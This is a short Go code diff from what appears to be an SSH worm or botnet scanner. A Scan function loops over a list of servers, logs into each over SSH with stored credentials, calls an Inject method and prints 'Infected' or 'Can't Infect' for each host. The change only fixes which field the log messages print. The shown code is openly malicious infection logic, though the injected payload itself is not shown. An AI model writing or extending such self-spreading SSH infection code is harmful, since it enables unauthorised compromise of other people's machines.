@@ -43,12 +43,12 @@ func Scan() {
 
 		ses, err := sshNew(serv[1], serv[2], serv[0])
 		if err != nil {
-			fmt.Println("[HOMO SCANNER] Can't Infect: " + serv[1] + ":22")
+			fmt.Println("[HOMO SCANNER] Can't Infect: " + serv[0] + ":22")
 			continue
 		}
 
 		ses.Inject()
-		fmt.Println("[HOMO SCANNER] Infected: " + serv[1] + ":22")
+		fmt.Println("[HOMO SCANNER] Infected: " + serv[0] + ":22")
 	}
 }
 
